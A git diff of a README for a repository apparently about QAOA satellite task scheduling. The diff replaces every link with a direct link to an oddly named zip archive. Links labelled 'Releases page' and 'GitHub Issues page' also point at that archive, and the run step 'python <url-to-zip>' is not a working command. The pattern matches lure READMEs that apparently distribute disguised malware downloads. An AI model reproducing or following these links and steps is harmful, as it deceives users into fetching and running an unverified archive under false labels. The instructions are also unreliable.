@@ -1,6 +1,6 @@
 # 🌌 QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project- - Optimize Your Satellite Scheduling
 
-[![Download Now](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip)
+[![Download Now](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip)
 
 ## 📖 Introduction 
 
@@ -11,7 +11,7 @@ This repository demonstrates the implementation of the QAOA algorithm for energy
 To get started, follow these simple steps:
 
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip) to download the application files.
+   Visit the [Releases page](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip) to download the application files.
 
 2. **Prepare Your System**  
    Ensure that your computer meets the following requirements:
@@ -30,14 +30,14 @@ To get started, follow these simple steps:
    After installation, locate the downloaded files. Open the command prompt or terminal in the folder where the application is located. Run the application using:
 
    ```
-   python https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip
+   python https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip
    ```
 
 ## 📥 Download & Install
 
 You can download the latest version of our software from the Releases page. 
 
-[Visit this page to download.](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip) 
+[Visit this page to download.](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip) 
 
 After downloading, follow the steps mentioned in the **Getting Started** section to install and run the application smoothly.
 
@@ -67,7 +67,7 @@ If you encounter any issues while downloading or running the application, consid
 - **Dependency Issues:** If libraries are missing, revisit the dependency installation step. 
 - **Running in Different Environments:** If the application does not run as expected, try executing it in a different terminal or command line setup.
 
-Feel free to consult the [GitHub Issues page](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip) to see if others have faced similar problems or to report a new issue.
+Feel free to consult the [GitHub Issues page](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip) to see if others have faced similar problems or to report a new issue.
 
 ## 🌍 Community and Contribution
 
@@ -83,4 +83,4 @@ This project is open-source and available under the MIT License. Feel free to us
 
 For any inquiries, please reach out via GitHub or connect through our issues section. Your feedback is important to us.
 
-[Download Now](https://github.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/raw/refs/heads/main/Day3/Energy_Scheduling_Satellite_Based_Task_QAO_Project_Efficient_3.8.zip) and start optimizing your satellite task scheduling today!
+[Download Now](https://raw.githubusercontent.com/samshohag/QAOA-Based-Energy-Efficient-Satellite-Task-Scheduling-Project-/main/assets/Based_Scheduling_Efficient_Project_Task_QAO_Satellite_Energy_v1.3-beta.1.zip) and start optimizing your satellite task scheduling today!
